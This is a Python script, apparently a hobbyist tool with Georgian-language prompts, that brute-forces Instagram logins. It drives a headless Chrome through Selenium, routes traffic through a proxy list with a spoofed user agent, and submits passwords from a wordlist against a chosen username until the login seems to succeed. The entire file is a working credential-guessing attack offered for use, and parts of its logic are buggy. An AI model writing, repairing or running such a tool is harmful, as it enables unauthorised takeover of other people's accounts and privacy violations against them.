import os
import colorama
from colorama import Fore, Back, Style, init
init(autoreset=True)
colorama.init()
import time
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.common.by import By

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos', 'cls'): 
        command = 'cls'
    os.system(command)


clearConsole()

banner = ("""
           __________                                 
         .'----------`.                              
         | .--------. |                             
         | |########| |       __________              
         | |########| |      /__________\             
.--------| `--------' |------|    --=-- |-------------.
|        `----,-.-----'      |o ======  |             | 
|       ______|_|_______     |__________|             | 
|      /  %%%%%%%%%%%%  \                             | 
|     /  %%%%%%%%%%%%%%  \                            | 
|     ^^^^^^^^^^^^^^^^^^^^                            | 
+-----------------------------------------------------+
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 

""")


bannerBrute = (""" 
****************************************************************************************************

Y88b   d88P 8888888b.  888888b.        888888b.   8888888b.  888     888 88888888888 8888888888 
 Y88b d88P  888  "Y88b 888  "88b       888  "88b  888   Y88b 888     888     888     888        
  Y88o88P   888    888 888  .88P       888  .88P  888    888 888     888     888     888        
   Y888P    888    888 8888888K.       8888888K.  888   d88P 888     888     888     8888888    
    888     888    888 888  "Y88b      888  "Y88b 8888888P"  888     888     888     888        
    888     888    888 888    888      888    888 888 T88b   888     888     888     888        
    888     888  .d88P 888   d88P      888   d88P 888  T88b  Y88b. .d88P     888     888        
    888     8888888P"  8888888P"       8888888P"  888   T88b  "Y88888P"      888     8888888888 
                                                                                                                   
   version: 2.0
   Coded by love from: Deniss#5093

****************************************************************************************************                                                               
""")

def brutepy():
    try:
     username=driver.find_element_by_name("username")
     password=driver.find_element_by_name("password")
     login_button=driver.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
     username.send_keys(email) 
     password.send_keys(brute)
     clearConsole()
     print(Fore.GREEN + banner)

     print(Fore.RED + "[+] უსერნამი: ", Fore.GREEN + email)
     print(Fore.RED + "[+] ვნახულობ: ",Fore.GREEN + brute)

     login_button.click()
     time.sleep(3)
     driver.refresh()
     time.sleep(2)
    except NoSuchElementException:
        print(Fore.RED + "[+] პაროლი ნაპოვნია", Fore.GREEN + '↑↑↑↑')

print(Fore.RED + bannerBrute)
email=input(Fore.BLUE + "\n \nინსტაგრამის უსერნაიმი: ")
wordlist=input(Fore.BLUE + "სახელი პასლისთის: ")
file = open(f'{wordlist}.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()

proxylist=input(Fore.BLUE + "სახელი პროქსილისთის: ")

filebrute = open(f'{proxylist}.txt', 'r')
proxybo = []
for line in filebrute:
    line = line.strip()
    proxybo.append(line)


proxy_ip_port = (proxybo)
proxy = Proxy()
proxy.proxy_type = ProxyType.MANUAL
proxy.http_proxy = proxy_ip_port
proxy.ssl_proxy = proxy_ip_port

capabilities = webdriver.DesiredCapabilities.CHROME
proxy.add_to_capabilities(capabilities)
time.sleep(5)

clearConsole()

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"

options = webdriver.ChromeOptions()
options.headless = True
options.add_argument(f'user-agent={user_agent}')
options.add_argument("--window-size=1920,1080")
options.add_argument('--ignore-certificate-errors')
options.add_argument('--allow-running-insecure-content')
options.add_argument("--disable-extensions")
options.add_argument("--proxy-server='direct://'")
options.add_argument("--proxy-bypass-list=*")
options.add_argument("--start-maximized")
options.add_argument('--disable-gpu')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--no-sandbox')


driver = webdriver.Chrome(executable_path="chromedriver.exe", desired_capabilities=capabilities, options=options)

#options=chrome_options )
# desired_capabilities=capabilities
time.sleep(3)
  #url=driver.get("https://www.instagram.com/accounts/login/")

driver.get("https://www.instagram.com/accounts/login/")

time.sleep(3)

def is_element_present():
        try: 
            driver.find_element_by_xpath('//*[@id="mount_0_0_Mv"]/div/div[1]/div/div[2]/div[1]/a/svg/path[2]')
            print(f'პაროლი ნაპოვნია: {brute}')
        except NoSuchElementException as e: return False
        return True
        
for brute in bruteforce:
    try:
        brutepy()
        is_element_present()
    except:
        print('ვერცერთი პასვორდი ვერ დაემთხვა, ან რამე დაზიანებაა')
       